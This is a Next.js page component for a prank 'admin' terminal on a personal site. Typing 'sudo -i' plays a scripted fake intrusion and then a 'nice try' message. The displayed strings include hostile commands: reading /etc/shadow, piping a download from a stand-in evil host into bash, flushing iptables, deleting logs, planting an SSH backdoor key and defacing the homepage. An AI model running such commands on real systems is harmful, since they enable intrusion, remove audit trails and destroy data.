"use client";

import { useEffect, useRef, useState } from "react";
import Link from "next/link";

type Phase = "waiting" | "hacking" | "busted";

interface HistoryEntry {
  cmd: string;
  error?: string;
  hint?: string;
}

interface Line {
  text: string;
  type: "cmd" | "output";
}

const HACKING_SEQUENCE: { line: Line; delay: number }[] = [
  { line: { text: "[sudo] password for visitor: ••••••••", type: "output" }, delay: 300 },
  { line: { text: "uname -a", type: "cmd" }, delay: 750 },
  { line: { text: "Linux amark.dev 5.15.0-1-aws #1 SMP x86_64 GNU/Linux", type: "output" }, delay: 1000 },
  { line: { text: "cat /etc/shadow | head -3", type: "cmd" }, delay: 1300 },
  { line: { text: "root:$6$rounds=656000$xK3vB7Lp$aGfT2...REDACTED", type: "output" }, delay: 1550 },
  { line: { text: "www-data:$6$rounds=656000$xK3vB7Lp$bHqZ9...REDACTED", type: "output" }, delay: 1700 },
  { line: { text: "curl -fsSL https://totally-not-evil.sh | bash", type: "cmd" }, delay: 2000 },
  { line: { text: "  % Total    % Received  % Xferd  Average  Speed", type: "output" }, delay: 2250 },
  { line: { text: "100  4.2M  100  4.2M    0     0   8.1M      0  --:--:-- ✓", type: "output" }, delay: 2500 },
  { line: { text: "Installing rootkit... [████████████████████] 100%", type: "output" }, delay: 2800 },
  { line: { text: "iptables -F && iptables -P INPUT ACCEPT", type: "cmd" }, delay: 3050 },
  { line: { text: "Firewall disabled. All ports open. ✓", type: "output" }, delay: 3250 },
  { line: { text: "rm -rf /var/log/* && history -c", type: "cmd" }, delay: 3500 },
  { line: { text: "Logs purged. Tracks covered. ✓", type: "output" }, delay: 3750 },
  { line: { text: "ssh-copy-id -i ~/.ssh/backdoor.pub root@amark.dev", type: "cmd" }, delay: 4000 },
  { line: { text: "Backdoor installed. Persistence achieved. ✓", type: "output" }, delay: 4300 },
  { line: { text: "echo 'pwned' > /var/www/amark.dev/index.html", type: "cmd" }, delay: 4600 },
];

export default function AdminPage() {
  const [phase, setPhase] = useState<Phase>("waiting");
  const [inputValue, setInputValue] = useState("");
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [visibleLines, setVisibleLines] = useState<Line[]>([]);
  const inputRef = useRef<HTMLInputElement>(null);
  const bottomRef = useRef<HTMLDivElement>(null);
  const timersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  useEffect(() => {
    const t = setTimeout(() => inputRef.current?.focus(), 100);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [visibleLines, history, phase]);

  useEffect(() => () => timersRef.current.forEach(clearTimeout), []);

  function handleTerminalClick() {
    if (phase === "waiting") inputRef.current?.focus();
  }

  function handleEnter() {
    const cmd = inputValue.trim();
    setInputValue("");

    if (cmd === "sudo -i") {
      // Trigger the sequence
      setHistory((h) => [...h, { cmd }]);
      setPhase("hacking");
      HACKING_SEQUENCE.forEach(({ line, delay }) => {
        const t = setTimeout(() => setVisibleLines((prev) => [...prev, line]), delay + 200);
        timersRef.current.push(t);
      });
      const busted = setTimeout(() => setPhase("busted"), 5200);
      timersRef.current.push(busted);
      return;
    }

    const isFirstAttempt = history.length === 0;
    const entry: HistoryEntry = {
      cmd: cmd || "",
      error: cmd
        ? `bash: ${cmd.split(" ")[0]}: command not found`
        : undefined,
      hint: isFirstAttempt
        ? "try running sudo -i for root privileges"
        : undefined,
    };
    setHistory((h) => [...h, entry]);
  }

  const visitorPrompt = (
    <span className="select-none">
      <span className="text-green-400">visitor</span>
      <span className="text-zinc-500">@</span>
      <span className="text-cyan-400">amark.dev</span>
      <span className="text-zinc-500">:~$ </span>
    </span>
  );

  const rootPrompt = (
    <span className="select-none">
      <span className="text-red-400 font-bold">root</span>
      <span className="text-zinc-500">@</span>
      <span className="text-cyan-400">amark.dev</span>
      <span className="text-zinc-500">:~# </span>
    </span>
  );

  const isActive = phase === "waiting";

  return (
    <div
      className="flex min-h-screen items-center justify-center bg-[#09090b] p-4 sm:p-8"
      onClick={handleTerminalClick}
    >
      <div className="w-full max-w-2xl">
        <div className="overflow-hidden rounded-xl border border-white/10 shadow-[0_0_60px_rgba(0,0,0,0.8)]">
          {/* Title bar */}
          <div className="flex items-center gap-3 border-b border-white/[0.06] bg-zinc-900/80 px-4 py-3">
            <div className="flex gap-1.5">
              <div className="h-3 w-3 rounded-full bg-red-500/90" />
              <div className="h-3 w-3 rounded-full bg-yellow-400/90" />
              <div className="h-3 w-3 rounded-full bg-green-500/90" />
            </div>
            <span className="mx-auto font-mono text-xs text-zinc-400">
              {phase === "waiting" ? "amark.dev — bash — 80×24" : "amark.dev — root — 80×24 ⚠️"}
            </span>
          </div>

          {/* Terminal body */}
          <div className="min-h-[440px] bg-zinc-950 p-5 font-mono text-sm leading-relaxed">
            <p className="text-zinc-600">Last login: {new Date().toUTCString()} on pts/0</p>
            <p className="mb-1 text-xs text-red-500/70">WARNING: Unauthorized access to this system is prohibited.</p>
            <p className="mb-4 text-xs text-red-500/70">All activity is monitored and logged.</p>

            {/* Command history */}
            {history.map((entry, i) => (
              <div key={i} className="mb-1">
                <div>
                  {visitorPrompt}
                  <span className="text-zinc-100">{entry.cmd}</span>
                </div>
                {entry.error && (
                  <div className="text-red-400/80">{entry.error}</div>
                )}
                {entry.hint && (
                  <div className="mt-1 text-yellow-400/80">hint: {entry.hint}</div>
                )}
              </div>
            ))}

            {/* sudo -i line + hacking sequence */}
            {phase !== "waiting" && (
              <>
                <div className="mb-0.5">
                  {visitorPrompt}
                  <span className="text-zinc-100">sudo -i</span>
                </div>
                {visibleLines.map((line, i) => (
                  <div key={i} className="mb-0.5">
                    {line.type === "cmd" ? (
                      <>{rootPrompt}<span className="text-zinc-100">{line.text}</span></>
                    ) : (
                      <span className="text-green-400/80">&nbsp;&nbsp;{line.text}</span>
                    )}
                  </div>
                ))}
                {phase === "busted" && (
                  <div className="mt-6 rounded-lg border border-cyan-400/25 bg-cyan-400/5 px-5 py-4">
                    <p className="text-base font-semibold text-cyan-300">
                      ha ha 😄 you think I would give you admin privileges?
                    </p>
                    <p className="mt-2 text-xs text-zinc-500">
                      Nice try. The site is fine.{" "}
                      <Link href="/" className="text-cyan-400 underline-offset-2 hover:underline">
                        ← go back
                      </Link>
                    </p>
                  </div>
                )}
              </>
            )}

            {/* Active prompt */}
            {isActive && (
              <div className="flex items-center">
                {visitorPrompt}
                <span className="text-zinc-100">{inputValue}</span>
                <span
                  className="ml-px inline-block h-[1.1em] w-[0.55em] bg-zinc-100"
                  style={{ animation: "terminal-blink 1s step-end infinite" }}
                />
              </div>
            )}

            <div ref={bottomRef} />
          </div>
        </div>

        {isActive && history.length === 0 && (
          <p className="mt-3 text-center font-mono text-xs text-zinc-600">
            type a command and press{" "}
            <kbd className="rounded bg-zinc-800 px-1.5 py-0.5 text-zinc-400">Enter</kbd>
          </p>
        )}
      </div>

      {isActive && (
        <input
          ref={inputRef}
          className="pointer-events-none fixed opacity-0"
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          onKeyDown={(e) => { if (e.key === "Enter") { e.preventDefault(); handleEnter(); } }}
          autoComplete="off"
          spellCheck={false}
        />
      )}
    </div>
  );
}
